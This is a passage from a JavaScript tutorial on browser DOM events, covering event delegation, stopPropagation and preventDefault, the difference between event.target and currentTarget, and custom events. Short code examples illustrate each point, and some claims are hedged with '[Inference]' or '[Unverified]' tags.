  if (button && parent.contains(button)) {
    // Handle button or any descendant of button
  }
});
```

**classList/className checks** - Specific class testing:

```javascript
parent.addEventListener('click', (event) => {
  if (event.target.classList.contains('actionable')) {
    // Handle elements with specific class
  }
});
```

**data-attribute matching**:

```javascript
parent.addEventListener('click', (event) => {
  const action = event.target.dataset.action;
  if (action) {
    handlers[action]?.(event);
  }
});
```

### Closest() for Nested Elements

When event targets contain nested children (icons inside buttons, spans inside links), `event.target` might reference the inner element rather than the intended interactive element:

```javascript
// Problematic - target might be <span> inside button
parent.addEventListener('click', (event) => {
  if (event.target.tagName === 'BUTTON') {
    // Misses clicks on button's children
  }
});

// Better - finds button ancestor
parent.addEventListener('click', (event) => {
  const button = event.target.closest('button');
  if (button && parent.contains(button)) {
    // Handles clicks on button or any descendant
  }
});
```

The `parent.contains(button)` check prevents matching elements outside the delegation scope.

### Performance Characteristics

**Memory efficiency:**

- N elements with individual listeners: N event listener objects in memory
- N elements with delegation: 1 event listener object

**Event processing:**

- Individual listeners: Browser directly invokes handler on target
- Delegation: Browser bubbles event → ancestor handler executes → selector matching logic runs

**[Inference]** For small numbers of elements (<10), the selector matching overhead might exceed memory savings. For dynamic lists with dozens or hundreds of elements, delegation provides measurable benefits.

### Dynamic Content Handling

Delegation automatically handles elements added after listener attachment:

```javascript
list.addEventListener('click', (event) => {
  if (event.target.matches('.item')) {
    // Works for items added later via:
    // list.appendChild(newItem)
  }
});

// Items added dynamically are automatically handled
setTimeout(() => {
  list.innerHTML += '<div class="item">New Item</div>';
}, 1000);
```

No listener re-attachment required when DOM changes.

### Non-Bubbling Events

Some events don't bubble and cannot be delegated in the standard way:

**Non-bubbling events:**

- `focus`, `blur` (use `focusin`, `focusout` alternatives which do bubble)
- `load`, `unload`
- `mouseenter`, `mouseleave` (use `mouseover`, `mouseout` with relatedTarget checks)
- `scroll` (bubbles in some contexts but not reliably)

**Workarounds:**

```javascript
// focus/blur - use bubbling alternatives
parent.addEventListener('focusin', (event) => {
  if (event.target.matches('input')) {
    // Handles focus on inputs
  }
});

// mouseenter/mouseleave - use mouseover with relatedTarget
parent.addEventListener('mouseover', (event) => {
  if (event.target.matches('.item') && 
      !event.target.contains(event.relatedTarget)) {
    // Simulates mouseenter
  }
});

// scroll - must use capture phase or direct listeners
parent.addEventListener('scroll', handler, true); // Capture phase
```

### stopPropagation() Impact

If child elements or intermediate handlers call `event.stopPropagation()`, the event won't reach the delegating ancestor:

```javascript
// Delegation won't work if propagation stopped
childElement.addEventListener('click', (event) => {
  event.stopPropagation(); // Event never reaches parent
});

parent.addEventListener('click', (event) => {
  // Never called for childElement clicks
});
```

This creates implicit dependencies where delegation silently fails if propagation is interrupted.

### Multiple Selector Patterns

**Switch-based routing:**

```javascript
parent.addEventListener('click', (event) => {
  const { target } = event;
  
  if (target.matches('.delete')) {
    handleDelete(target);
  } else if (target.matches('.edit')) {
    handleEdit(target);
  } else if (target.matches('.view')) {
    handleView(target);
  }
});
```

**Action-based routing with data attributes:**

```javascript
parent.addEventListener('click', (event) => {
  const action = event.target.dataset.action;
  const handlers = {
    delete: handleDelete,
    edit: handleEdit,
    view: handleView
  };
  
  handlers[action]?.(event.target);
});
```

**Class-based handler mapping:**

```javascript
const handlerMap = new Map([
  ['delete-btn', handleDelete],
  ['edit-btn', handleEdit],
  ['save-btn', handleSave]
]);

parent.addEventListener('click', (event) => {
  for (const [className, handler] of handlerMap) {
    if (event.target.classList.contains(className)) {
      handler(event);
      break;
    }
  }
});
```

### Event Retargeting in Shadow DOM

Events crossing shadow DOM boundaries are retargeted so `event.target` appears to be the shadow host rather than the internal element:

```javascript
// Inside shadow DOM
shadowRoot.querySelector('button').addEventListener('click', (event) => {
  console.log(event.target); // <button>
});

// Outside shadow DOM with delegation
document.addEventListener('click', (event) => {
  console.log(event.target); // <custom-element> (shadow host)
});
```

Use `event.composedPath()` to access the original target across shadow boundaries.

### Delegation with Capture Phase

Attach listeners during capture phase for events that need interception before reaching targets:

```javascript
parent.addEventListener('click', (event) => {
  if (event.target.matches('.disabled')) {
    event.preventDefault();
    event.stopPropagation();
  }
}, true); // true = capture phase
```

This allows validation/cancellation before target-phase handlers execute.

### Preventing Default on Delegated Events

When delegating form submissions or link clicks, prevent default behavior selectively:

```javascript
form.addEventListener('submit', (event) => {
  if (event.target.matches('.ajax-form')) {
    event.preventDefault();
    // Handle with fetch
  }
  // Let non-matching forms submit normally
});

document.addEventListener('click', (event) => {
  const link = event.target.closest('a[data-spa]');
  if (link) {
    event.preventDefault();
    // Handle SPA navigation
  }
});
```

### Delegation Anti-Patterns

**Over-delegating to document/body:**

```javascript
// Creates global handler checking every click
document.addEventListener('click', (event) => {
  if (event.target.matches('.specific-button')) {
    // Runs selector match for all document clicks
  }
});
```

Better to delegate to nearest stable ancestor of target elements.

**Excessive selector complexity:**

```javascript
// Complex selector evaluated repeatedly
parent.addEventListener('click', (event) => {
  if (event.target.matches('.container > .list > .item:not(.disabled) > .action')) {
    // Expensive matching on every click
  }
});
```

Simplify selectors or use data attributes for better performance.

**Ignoring event ordering:**

```javascript
// Multiple delegation handlers on same element
parent.addEventListener('click', handler1);
parent.addEventListener('click', handler2);
// Handler execution order is registration order
// No guaranteed priority without explicit coordination
```

### Memory Leak Prevention

Delegation reduces memory leaks by minimizing listener attachment to temporary elements:

```javascript
// Without delegation - potential leaks
function addItem() {
  const item = document.createElement('div');
  item.addEventListener('click', () => {
    // Closure may retain references
    expensiveData.process();
  });
  list.appendChild(item);
  // If item removed without listener cleanup, leak possible
}

// With delegation - no per-item listeners
list.addEventListener('click', (event) => {
  if (event.target.matches('.item')) {
    // No per-item closures
  }
});
```

### Framework Patterns

**React synthetic events** - [Inference] React historically used root-level delegation (React 16 and earlier delegated to document):

```javascript
// React automatically handles delegation
<div onClick={handler}>
  <button>Click</button>
  <button>Click</button>
</div>
```

React 17+ delegates to the root container rather than document.

**Vue event modifiers** support delegation-like patterns:

```html
<div @click="handleClick">
  <button>Item 1</button>
  <button>Item 2</button>
</div>
```

**Angular event binding** doesn't use delegation by default; each element gets its own listener.

### Use Case Decision Matrix

**Use delegation when:**

- Managing many similar child elements (lists, tables, grids)
- Child elements added/removed dynamically
- Memory constraints significant
- Event types bubble reliably

**Avoid delegation when:**

- Only 1-3 target elements exist
- Events don't bubble (without workarounds)
- Complex ancestor-descendant relationships make selector matching fragile
- Need guaranteed capture of stopped events
- Performance profiling shows selector matching overhead exceeds benefits

### Debugging Delegated Events

```javascript
parent.addEventListener('click', (event) => {
  console.log({
    target: event.target,           // Element that triggered event
    currentTarget: event.currentTarget, // Element with listener
    matches: event.target.matches('.selector'),
    path: event.composedPath()     // Full propagation path
  });
});
```

The path array shows all elements the event traverses, useful for understanding why delegation did or didn't trigger.

---

## stopPropagation, preventDefault

### Core Mechanics

**stopPropagation()** halts event progression through the DOM tree. Once called, the event stops traveling to subsequent nodes in the propagation path.

**preventDefault()** cancels the browser's default action for that event. The event continues propagating, but the native behavior (link navigation, form submission, text selection, etc.) is blocked.

These are independent operations—calling one doesn't affect the other's behavior.

```javascript
element.addEventListener('click', (e) => {
  e.stopPropagation(); // Event won't bubble to parent
  e.preventDefault();   // Link won't navigate (if on <a>)
});
```

### Event Propagation Phases

Events traverse three phases:

1. **Capture phase**: Root → target (downward)
2. **Target phase**: Handlers on the target element itself
3. **Bubble phase**: Target → root (upward)

**stopPropagation() behavior per phase:**

```javascript
// Capture phase listener
parent.addEventListener('click', (e) => {
  e.stopPropagation(); // Stops before reaching child
}, true); // Third parameter = capture phase

// Bubble phase listener (default)
child.addEventListener('click', (e) => {
  e.stopPropagation(); // Stops before reaching parent
});
```

When called during capture, the event never reaches the target. When called during bubble, the event doesn't propagate upward.

### Target Phase Behavior

[Inference: Based on event dispatch ordering]

During the target phase, **all listeners on the target element execute** regardless of when stopPropagation() is called:

```javascript
target.addEventListener('click', (e) => {
  console.log('First'); // Executes
  e.stopPropagation();
});

target.addEventListener('click', (e) => {
  console.log('Second'); // Still executes
});

// Both log, then propagation stops
```

stopPropagation() only prevents reaching **different elements**, not other listeners on the same element.

### stopImmediatePropagation()

Halts propagation **and** prevents subsequent listeners on the current element:

```javascript
target.addEventListener('click', (e) => {
  console.log('First'); // Executes
  e.stopImmediatePropagation();
});

target.addEventListener('click', (e) => {
  console.log('Second'); // Never executes
});
```

Listener execution order follows registration order. stopImmediatePropagation() creates a hard stop at the current listener.

### Cancelable vs Non-Cancelable Events

preventDefault() only works if `event.cancelable === true`:

**Cancelable events** (partial list):

- `click`, `mousedown`, `mouseup`
- `keydown`, `keypress` (keyup is not cancelable [Unverified])
- `submit`, `contextmenu`
- `touchstart`, `touchmove`
- `wheel`, `beforeunput`

**Non-cancelable events**:

- `scroll` (already occurred)
- `focus`, `blur`
- `load`, `unload`
- `mouseenter`, `mouseleave`
- Most custom events unless explicitly set

```javascript
element.addEventListener('scroll', (e) => {
  e.preventDefault(); // No effect, scroll already happened
});

element.addEventListener('click', (e) => {
  console.log(e.cancelable); // true
  e.preventDefault(); // Works
});
```

### Default Actions by Event Type

**click on `<a>`:**

- Default: Navigate to href
- preventDefault(): Cancels navigation
- Common use: SPA routing, confirmation dialogs

**submit on `<form>`:**

- Default: HTTP submission, page reload
- preventDefault(): Stops submission
- Common use: AJAX form handling

**contextmenu:**

- Default: Shows browser context menu
- preventDefault(): Suppresses native menu
- Common use: Custom right-click menus

**keydown:**

- Default: Character insertion, shortcuts
- preventDefault(): Blocks key action
- Common use: Custom keyboard handling

```javascript
// Disable specific key
input.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    e.preventDefault(); // Prevents form submission or newline
  }
});
```

**dragstart:**

- Default: Initiates drag operation
- preventDefault(): Cancels drag
- Common use: Disable dragging on images/links

### defaultPrevented Property

Read-only boolean indicating if preventDefault() was called:

```javascript
child.addEventListener('click', (e) => {
  e.preventDefault();
});

parent.addEventListener('click', (e) => {
  console.log(e.defaultPrevented); // true
  // Parent can check if child cancelled default action
});
```

Useful for conditional logic in parent handlers that need to know if a descendant already cancelled the default.

### returnValue Property (Legacy)

Setting `event.returnValue = false` is the legacy IE equivalent of preventDefault():

```javascript
// Modern
e.preventDefault();

// Legacy (still works, but deprecated)
e.returnValue = false;
```

Modern code should use preventDefault(). returnValue exists for backwards compatibility [Inference: based on its deprecated status in specifications].

### Passive Event Listeners

Passive listeners **cannot call preventDefault()**:

```javascript
// Throws error if preventDefault() is called
element.addEventListener('touchstart', (e) => {
  e.preventDefault(); // Error in console
}, { passive: true });

// Passive default for touch/wheel in some browsers [Unverified]
element.addEventListener('wheel', handler); // May be passive by default
```

Passive listeners improve scroll performance by telling the browser the listener won't cancel scrolling. Chrome/Firefox default touch/wheel listeners to passive [Unverified: exact default behavior varies by browser version].

**Explicitly non-passive:**

```javascript
element.addEventListener('touchstart', handler, { passive: false });
```

### Event Delegation Patterns

stopPropagation() can break delegation:

```javascript
// Parent delegator
document.addEventListener('click', (e) => {
  if (e.target.matches('.button')) {
    console.log('Button clicked'); // Won't fire if propagation stopped
  }
});

// Child that stops propagation
button.addEventListener('click', (e) => {
  e.stopPropagation(); // Breaks parent's delegation
  // Handle locally
});
```

**Delegation-safe alternative** using capture phase:

```javascript
// Capture phase catches before child handlers
document.addEventListener('click', (e) => {
  if (e.target.matches('.button')) {
    console.log('Caught in capture'); // Fires even if child stops propagation
  }
}, true);
```

### Composed Events and Shadow DOM

[Unverified: Shadow DOM event behavior specifics]

Events have a `composed` property determining if they cross shadow boundaries:

**Composed events** (cross shadow boundaries):

- `click`, `mousedown`, `mouseup`
- `keydown`, `keypress`, `keyup`
- `focus`, `blur` (with relatedTarget retargeting)

**Non-composed events** (contained within shadow root):

- `mouseenter`, `mouseleave`
- Custom events (unless `composed: true`)

```javascript
// Inside shadow DOM
shadowElement.addEventListener('click', (e) => {
  e.stopPropagation(); // Stops within shadow tree first
  // If composed=true, can still propagate to light DOM
});
```

stopPropagation() respects shadow boundaries—it stops in the current tree (shadow or light) and at the boundary decision point [Inference].

### Synchronous vs Asynchronous Effects

Both methods operate **synchronously** during event dispatch:

```javascript
link.addEventListener('click', (e) => {
  e.preventDefault();
  console.log('After preventDefault'); // Executes immediately
  // Navigation is already cancelled at this point
});
```

The cancellation/stopping occurs immediately, not after the handler completes.

### preventDefault() on Custom Events

Custom events are non-cancelable by default:

```javascript
// Non-cancelable (default)
const event1 = new CustomEvent('myevent');
element.dispatchEvent(event1);
// preventDefault() would have no effect

// Cancelable
const event2 = new CustomEvent('myevent', { 
  cancelable: true 
});
element.dispatchEvent(event2);
// preventDefault() works, can check defaultPrevented
```

Check `event.cancelable` before attempting to prevent default on custom events.

### Multiple preventDefault() Calls

Calling preventDefault() multiple times is safe but redundant:

```javascript
element.addEventListener('click', (e) => {
  e.preventDefault();
  e.preventDefault(); // No additional effect
  e.preventDefault(); // Safe, just redundant
});
```

Once cancelled, the default action cannot be "uncancelled" within the same event dispatch.

### Form Submission Edge Cases

preventDefault() on submit event stops submission, but doesn't prevent validation:

```javascript
form.addEventListener('submit', (e) => {
  e.preventDefault();
  // HTML5 validation still runs before this fires
  // Invalid inputs prevent event from firing at all
});
```

[Inference: Validation occurs before submit event dispatch]

To bypass validation:

```javascript
form.noValidate = true; // Disables HTML5 validation
// or
submitButton.formNoValidate = true; // Per-button override
```

### Checkbox/Radio Input Behavior

preventDefault() on click affects input state:

```javascript
checkbox.addEventListener('click', (e) => {
  e.preventDefault();
  // Checkbox doesn't toggle
  // checked property remains unchanged
});
```

The click's default action includes toggling the checked state. Preventing default keeps the state unchanged.

### Text Selection Prevention

**mousedown** preventDefault() blocks text selection:

```javascript
element.addEventListener('mousedown', (e) => {
  e.preventDefault(); // Prevents text selection drag
  // Useful for custom drag operations
});
```

**selectstart** is the specific event for selection initiation:

```javascript
element.addEventListener('selectstart', (e) => {
  e.preventDefault(); // Also prevents selection
});
```

### Wheel Event Scrolling

preventDefault() on wheel blocks scroll:

```javascript
element.addEventListener('wheel', (e) => {
  e.preventDefault(); // Prevents scroll
  // Custom zoom or horizontal scroll implementation
}, { passive: false }); // Must be non-passive
```

[Unverified: Default passive behavior for wheel events varies by browser]

Without `passive: false`, the listener may be treated as passive and preventDefault() may fail silently in some browsers.

### Touch Event Sequences

Touch events fire in sequence: touchstart → touchmove → touchend → click

```javascript
element.addEventListener('touchstart', (e) => {
  e.preventDefault();
  // Prevents:
  // - touchmove events
  // - touchend event
  // - subsequent click event
  // - default touch behaviors (scroll, zoom)
});
```

Preventing touchstart cancels the entire touch interaction sequence. For fine-grained control, preventDefault() on specific touch phases.

### Keyboard Modifier Keys

preventDefault() applies to the combined key action:

```javascript
input.addEventListener('keydown', (e) => {
  if (e.ctrlKey && e.key === 's') {
    e.preventDefault(); // Blocks Ctrl+S (save dialog)
    // Custom save logic
  }
});
```

Modifier keys alone (pressing Ctrl without another key) typically have no default action to prevent.

### Return False Pattern

Returning `false` from an inline handler calls both methods:

```javascript
// Inline HTML handler
<a href="#" onclick="return false"> // Equivalent to both methods

// jQuery (not vanilla JS)
$('#element').on('click', () => {
  return false; // jQuery interprets this as both methods
});

// Vanilla JS - return value ignored
element.addEventListener('click', () => {
  return false; // Does nothing in modern listeners
});
```

[Inference: Inline handler behavior is specified in HTML standard]

In modern addEventListener, return values are ignored. Explicitly call preventDefault() and/or stopPropagation().

### Event.eventPhase Property

Indicates current propagation phase:

- `Event.CAPTURING_PHASE` (1): Capture phase
- `Event.AT_TARGET` (2): Target phase
- `Event.BUBBLING_PHASE` (3): Bubble phase

```javascript
element.addEventListener('click', (e) => {
  console.log(e.eventPhase); // 2 (at target)
  if (e.eventPhase === Event.BUBBLING_PHASE) {
    e.stopPropagation();
  }
});
```

Useful for conditional propagation control based on phase.

### Propagation Path Access

`event.composedPath()` returns the full propagation path:

```javascript
child.addEventListener('click', (e) => {
  const path = e.composedPath();
  // [child, parent, grandparent, document, Window]
  
  e.stopPropagation();
  // Path still shows full route, but traversal stops here
});
```

The path is determined at event creation. stopPropagation() doesn't alter the path array, just halts traversal [Inference].

### Once Option Interaction

The `once` option removes the listener after first invocation, independent of propagation:

```javascript
element.addEventListener('click', (e) => {
  e.stopPropagation(); // Stops propagation
  // Listener auto-removes after this regardless
}, { once: true });
```

`once` operates at the listener level. stopPropagation/preventDefault operate at the event level.

### Propagation in Capture vs Bubble

Stopping in capture prevents both target and bubble phases:

```javascript
parent.addEventListener('click', (e) => {
  e.stopPropagation(); // Child never receives event
}, true); // Capture

child.addEventListener('click', () => {
  console.log('Never fires'); // Prevented by parent's capture stop
});
```

Stopping in bubble only affects remaining bubble path:

```javascript
child.addEventListener('click', (e) => {
  e.stopPropagation(); // Parent won't receive event
});

parent.addEventListener('click', () => {
  console.log('Never fires'); // Child stopped bubbling
});
```

### Link Navigation with Hash

preventDefault() on hash links (`#section`) blocks both navigation and scroll:

```javascript
<a href="#section">Jump</a>

link.addEventListener('click', (e) => {
  e.preventDefault();
  // Neither URL change nor scroll occurs
  // Custom smooth scroll implementation possible
});
```

Without preventDefault(), clicking triggers:

1. URL hash update
2. Scroll to element with matching id
3. `:target` pseudo-class activation [Inference]

### Focus Event Cancellation

Focus/blur events are **not cancelable**:

```javascript
input.addEventListener('focus', (e) => {
  e.preventDefault(); // No effect
  console.log(e.cancelable); // false
  // Focus still occurs
});
```

To prevent focus, use `element.blur()` immediately after, or prevent the user action that triggers focus (e.g., preventDefault on mousedown).

### Drag and Drop Default Behaviors

Each drag event has specific defaults:

```javascript
// Prevent default on dragover to allow drop
dropzone.addEventListener('dragover', (e) => {
  e.preventDefault(); // Required for drop to work
});

// Prevent default on drop to handle custom drop logic
dropzone.addEventListener('drop', (e) => {
  e.preventDefault(); // Prevents browser's default drop action
  // Custom drop handling
});
```

[Inference: dragover must preventDefault() for the drop event to fire]

Without preventDefault() on dragover, the drop event won't fire on that element.

### Input Event Prevention

The `input` event is **not cancelable**:

```javascript
input.addEventListener('input', (e) => {
  e.preventDefault(); // No effect
  console.log(e.cancelable); // false
  // Input value change already occurred
});
```

To prevent input changes, use `beforeinput` (cancelable):

```javascript
input.addEventListener('beforeinput', (e) => {
  e.preventDefault(); // Blocks the input change
  console.log(e.cancelable); // true
});
```

[Unverified: beforeinput support varies, older browsers may not support it]

### Performance Implications

[Inference: Based on browser rendering optimization patterns]

**stopPropagation() performance:**

- Minimal impact—stops iteration through listener array
- Reduces handler invocations, potentially improving performance
- Can break expected behavior if delegation patterns depend on bubbling

**preventDefault() performance:**

- Minimal direct cost
- May have indirect benefits (e.g., preventing scroll allows custom handling)
- Passive listeners optimize by guaranteeing preventDefault() won't be called

Neither method has significant inherent performance cost. The impact comes from what happens (or doesn't happen) as a result.

---

## Event.target vs Event.currentTarget

### Fundamental Distinction

`Event.target` and `Event.currentTarget` represent different elements in the event flow, which becomes critical when events bubble or capture through nested DOM structures.

**Event.target**: The element that originally triggered the event (where the event actually occurred)

**Event.currentTarget**: The element that the event listener is attached to (where the handler is registered)

```javascript
document.querySelector('.parent').addEventListener('click', (event) => {
  console.log(event.target);        // Element that was clicked
  console.log(event.currentTarget); // Always .parent (the listener's element)
});
```

### Event Flow Context

Understanding these properties requires knowledge of how events propagate through the DOM:

1. **Capture phase**: Event travels down from document root to target
2. **Target phase**: Event reaches the actual target element
3. **Bubble phase**: Event bubbles back up to document root

```html
<div class="grandparent">
  <div class="parent">
    <button class="child">Click me</button>
  </div>
</div>
```

```javascript
const grandparent = document.querySelector('.grandparent');
const parent = document.querySelector('.parent');
const button = document.querySelector('.child');

grandparent.addEventListener('click', (e) => {
  console.log('Grandparent handler');
  console.log('target:', e.target);              // <button>
  console.log('currentTarget:', e.currentTarget); // <div class="grandparent">
});

parent.addEventListener('click', (e) => {
  console.log('Parent handler');
  console.log('target:', e.target);              // <button>
  console.log('currentTarget:', e.currentTarget); // <div class="parent">
});

button.addEventListener('click', (e) => {
  console.log('Button handler');
  console.log('target:', e.target);              // <button>
  console.log('currentTarget:', e.currentTarget); // <button>
});
```

When clicking the button:

- `e.target` is always `<button>` in all three handlers
- `e.currentTarget` changes based on which element's listener is executing

### Behavior When Target Equals CurrentTarget

At the target phase, both properties reference the same element:

```javascript
button.addEventListener('click', (e) => {
  console.log(e.target === e.currentTarget); // true
  console.log(e.eventPhase === Event.AT_TARGET); // true
});
```

For non-bubbling events (like `focus`, `blur`, `load`), `target` and `currentTarget` are always identical since these events don't propagate.

### Practical Use Cases

#### Event Delegation

`Event.target` is essential for event delegation patterns:

```javascript
// Inefficient: Multiple listeners
document.querySelectorAll('.item').forEach(item => {
  item.addEventListener('click', handleClick);
});

// Efficient: Single delegated listener
document.querySelector('.list').addEventListener('click', (e) => {
  // Use target to identify which item was clicked
  if (e.target.matches('.item')) {
    handleItemClick(e.target);
  }
  
  // Or traverse to find the item
  const item = e.target.closest('.item');
  if (item) {
    handleItemClick(item);
  }
});
```

#### Preventing Action on Container

Using `currentTarget` to ensure actions only apply to the direct element:

```javascript
modal.addEventListener('click', (e) => {
  // Close only if clicking the modal background, not its contents
  if (e.target === e.currentTarget) {
    closeModal();
  }
});
```

#### Dynamic Content Handling

```javascript
document.querySelector('.dynamic-container').addEventListener('click', (e) => {
  // target identifies the specific element clicked (even if added dynamically)
  const clickedButton = e.target.closest('button');
  
  if (clickedButton) {
    const action = clickedButton.dataset.action;
    const container = e.currentTarget; // The .dynamic-container
    
    handleAction(action, clickedButton, container);
  }
});
```

#### Form Validation

```javascript
form.addEventListener('input', (e) => {
  const changedField = e.target;           // Specific input that changed
  const form = e.currentTarget;            // Always the form element
  
  validateField(changedField);
  updateFormStatus(form);
});
```

### Target Mutation Scenarios

#### Events from Child Elements

When an event originates from a deeply nested child:

```html
<div class="card">
  <div class="header">
    <h3>Title</h3>
    <span class="icon">×</span>
  </div>
  <div class="content">...</div>
</div>
```

```javascript
card.addEventListener('click', (e) => {
  console.log(e.target);        // Could be .card, .header, h3, span, etc.
  console.log(e.currentTarget); // Always .card
  
  // Finding the semantic element you care about
  if (e.target.matches('.icon') || e.target.closest('.icon')) {
    closeCard();
  }
});
```

#### Text Nodes and Inline Elements

`Event.target` can reference inline elements or even text nodes in some scenarios:

```html
<button>Click <strong>here</strong> now</button>
```

```javascript
button.addEventListener('click', (e) => {
  console.log(e.target);        // Could be <button>, <strong>, or text node
  console.log(e.currentTarget); // Always <button>
  
  // Safe way to work with the button
  const button = e.currentTarget;
  button.disabled = true;
});
```

### Arrow Functions and This Context

`currentTarget` is particularly important when `this` binding is unavailable:

```javascript
// Traditional function: 'this' equals currentTarget
element.addEventListener('click', function(e) {
  console.log(this === e.currentTarget); // true
  this.classList.toggle('active');
});

// Arrow function: 'this' is lexically bound
element.addEventListener('click', (e) => {
  // console.log(this); // Not the element
  e.currentTarget.classList.toggle('active'); // Must use currentTarget
});
```

### Capture Phase Considerations

Both properties work identically during capture phase:

```javascript
parent.addEventListener('click', (e) => {
  console.log('Bubble phase');
  console.log(e.target);        // <button>
  console.log(e.currentTarget); // <div class="parent">
}, false); // false = bubble phase (default)

parent.addEventListener('click', (e) => {
  console.log('Capture phase');
  console.log(e.target);        // <button>
  console.log(e.currentTarget); // <div class="parent">
}, true); // true = capture phase
```

The distinction between `target` and `currentTarget` remains the same regardless of event phase.

### Stopping Propagation Effects

When `stopPropagation()` or `stopImmediatePropagation()` is called, it affects which handlers execute but doesn't change `target` or `currentTarget` values:

```javascript
child.addEventListener('click', (e) => {
  console.log(e.target);        // <button>
  console.log(e.currentTarget); // <button>
  e.stopPropagation();
});

parent.addEventListener('click', (e) => {
  // This handler never executes due to stopPropagation()
  console.log('This will not run');
});
```

### Null CurrentTarget After Event Completion

After the event finishes propagating, `currentTarget` is set to `null` for garbage collection:

```javascript
let savedEvent;

button.addEventListener('click', (e) => {
  console.log(e.currentTarget); // <button>
  savedEvent = e;
  
  setTimeout(() => {
    console.log(savedEvent.target);        // Still <button>
    console.log(savedEvent.currentTarget); // null
  }, 0);
});
```

This is by design to prevent memory leaks from retained event references. `target` remains accessible because it's a direct DOM reference.

### Synthetic Events and Frameworks

React and other frameworks create synthetic event wrappers, but the `target` vs `currentTarget` distinction remains:

```jsx
// React example
<div onClick={handleClick}>
  <button>Click me</button>
</div>

function handleClick(e) {
  console.log(e.target);        // Native DOM button element
  console.log(e.currentTarget); // Native DOM div element
  
  // React's synthetic event
  console.log(e.nativeEvent.target);
  console.log(e.nativeEvent.currentTarget);
}
```

React's synthetic events maintain the same semantic distinction between these properties.

### Common Patterns and Anti-Patterns

#### Pattern: Safe Element Reference

```javascript
// Good: Using currentTarget for reliable element reference
container.addEventListener('click', (e) => {
  const container = e.currentTarget;
  container.classList.add('clicked');
});

// Risky: Using target assumes it's always the container
container.addEventListener('click', (e) => {
  e.target.classList.add('clicked'); // Might be a child element
});
```

#### Pattern: Conditional Logic Based on Target

```javascript
menu.addEventListener('click', (e) => {
  const menuItem = e.target.closest('.menu-item');
  const menu = e.currentTarget;
  
  if (menuItem && menu.contains(menuItem)) {
    handleMenuItemClick(menuItem);
  }
});
```

#### Anti-Pattern: Confusing Target with CurrentTarget

```javascript
// Problematic: Assumes target is the listened element
parent.addEventListener('click', (e) => {
  e.target.dataset.clicks++; // Might increment child's dataset, not parent's
});

// Correct: Use currentTarget for the listened element
parent.addEventListener('click', (e) => {
  e.currentTarget.dataset.clicks++;
});
```

### Performance Implications

Using `currentTarget` instead of querying the DOM provides performance benefits:

```javascript
// Less efficient: Re-querying DOM
document.querySelector('.container').addEventListener('click', (e) => {
  const container = document.querySelector('.container');
  updateContainer(container);
});

// More efficient: Using currentTarget
document.querySelector('.container').addEventListener('click', (e) => {
  updateContainer(e.currentTarget);
});
```

The event object already maintains the reference, avoiding additional DOM traversal.

### Debugging and Logging

When debugging event handlers, logging both properties reveals event flow:

```javascript
element.addEventListener('click', (e) => {
  console.log({
    target: e.target,
    currentTarget: e.currentTarget,
    phase: e.eventPhase,
    bubbles: e.bubbles,
    targetIsCurrentTarget: e.target === e.currentTarget
  });
});
```

This output clarifies whether the handler is executing due to bubbling or direct invocation.

### Edge Cases

#### Shadow DOM Boundaries

In Shadow DOM, `target` gets retargeted to maintain encapsulation:

```javascript
// Outside shadow root
customElement.addEventListener('click', (e) => {
  console.log(e.target);        // The custom element (retargeted)
  console.log(e.currentTarget); // The custom element
});

// Inside shadow root
shadowRoot.querySelector('button').addEventListener('click', (e) => {
  console.log(e.target);        // The actual button
  console.log(e.currentTarget); // The actual button
});
```

[Inference] Retargeting ensures internal shadow DOM structure remains hidden from outside listeners.

#### Detached Elements

If an element is removed from the DOM during event handling:

```javascript
element.addEventListener('click', (e) => {
  console.log(e.target);        // Still references the element
  console.log(e.currentTarget); // Still references the element
  
  e.currentTarget.remove();
  
  // Both references still work after removal
  console.log(e.target.textContent);
  console.log(e.currentTarget.textContent);
});
```

Both properties maintain references to elements even after DOM removal during the event.

---

## Custom Events

### CustomEvent Constructor

The `CustomEvent` interface creates custom events that can carry arbitrary data and be dispatched through the DOM event system. It extends the base `Event` interface with the ability to attach custom data via the `detail` property.

**Syntax:**

```javascript
new CustomEvent(typeArg, options)
```

**Parameters:**

`typeArg` (string, required): The name of the event. This is case-sensitive and serves as the event identifier that listeners will register for.

`options` (object, optional): An object with the following properties:

- `detail`: Any value to be passed as custom data with the event (default: `null`)
- `bubbles`: Boolean indicating whether the event bubbles up through the DOM (default: `false`)
- `cancelable`: Boolean indicating whether the event can be canceled (default: `false`)
- `composed`: Boolean indicating whether the event will trigger listeners outside of a shadow DOM (default: `false`)

### Creating Custom Events

```javascript
// Simple custom event
const simpleEvent = new CustomEvent('userLogin');

// Custom event with data
const dataEvent = new CustomEvent('userLogin', {
  detail: {
    username: 'alice',
    timestamp: Date.now(),
    sessionId: 'abc123'
  }
});

// Custom event with full options
const complexEvent = new CustomEvent('dataUpdate', {
  detail: { items: [1, 2, 3], total: 3 },
  bubbles: true,
  cancelable: true,
  composed: true
});
```

### The detail Property

The `detail` property is the primary mechanism for passing custom data with events. It can contain any JavaScript value: primitives, objects, arrays, functions, or any other data type.

```javascript
// Various detail types
const numberEvent = new CustomEvent('score', { detail: 42 });
const arrayEvent = new CustomEvent('items', { detail: [1, 2, 3] });
const objectEvent = new CustomEvent('user', { 
  detail: { name: 'Bob', age: 30 } 
});
const functionEvent = new CustomEvent('callback', { 
  detail: () => console.log('Called') 
});
```

Accessing the detail property in event listeners:

```javascript
element.addEventListener('customEvent', (event) => {
  console.log(event.detail); // Access custom data
  console.log(event.detail.username); // Access nested properties
});
```

### dispatchEvent Method

The `dispatchEvent()` method fires an event on a specified event target, triggering any registered listeners for that event type. It returns `false` if the event is cancelable and any listener called `preventDefault()`, otherwise returns `true`.

**Syntax:**

```javascript
target.dispatchEvent(event)
```

**Parameters:**

`event`: An `Event` or `CustomEvent` object to be dispatched.

**Return value:**

`false` if the event is cancelable and at least one event handler called `event.preventDefault()`, otherwise `true`.

### Dispatching Custom Events

```javascript
const element = document.getElementById('myElement');

// Create and dispatch in separate steps
const event = new CustomEvent('myEvent', { detail: { data: 'value' } });
element.dispatchEvent(event);

// Create and dispatch inline
element.dispatchEvent(new CustomEvent('myEvent', {
  detail: { data: 'value' },
  bubbles: true
}));
```

### Event Bubbling and Propagation

**Bubbling:** When `bubbles: true`, the event propagates up through the DOM tree from the target element to its ancestors.

```javascript
const childElement = document.getElementById('child');
const parentElement = document.getElementById('parent');

// Listener on parent
parentElement.addEventListener('customEvent', (event) => {
  console.log('Caught at parent:', event.target.id);
});

// Dispatch from child with bubbling
childElement.dispatchEvent(new CustomEvent('customEvent', {
  detail: { message: 'bubbles up' },
  bubbles: true
}));
// Output: "Caught at parent: child"
```

